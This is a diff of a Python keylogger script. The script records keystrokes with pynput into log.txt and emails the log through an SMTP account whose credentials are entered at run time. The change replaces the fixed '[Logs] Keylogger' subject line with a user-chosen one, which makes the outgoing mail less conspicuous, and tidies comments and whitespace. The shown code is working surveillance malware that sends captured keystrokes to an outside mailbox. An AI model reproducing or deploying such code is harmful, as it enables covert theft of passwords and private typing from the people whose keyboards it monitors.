@@ -16,14 +16,15 @@ logs = open('log.txt','w+')
 from_mail = input("From => ")
 password_mail = input("Password => ")
 to_mail = input("To => ")
-print("\033[1;37mSTOP: \033[1;33mKEY-ESC\033[0m")
+subject_mail = input("Subject => ")
+print("\n\033[1;37mSTOP: \033[1;33mKEY-ESC\033[0m")
 
 def sendFile():
     msg = MIMEMultipart()
     msg['From'] = from_mail 	#Your mail
     password = password_mail 	#Your email password
-    msg['To'] = to_mail  		#destination
-    msg['Subject'] = "[Logs] Keylogger"
+    msg['To'] = to_mail  		#Destination
+    msg['Subject'] = subject_mail 
     msg.attach(MIMEText(open('log.txt').read())) #File to send
 
     try:
@@ -80,4 +81,4 @@ def convert(key):
         return str(key)    
 
 with pynput.keyboard.Listener(on_press=pressKey) as listen:
-    listen.join()   
+    listen.join()  
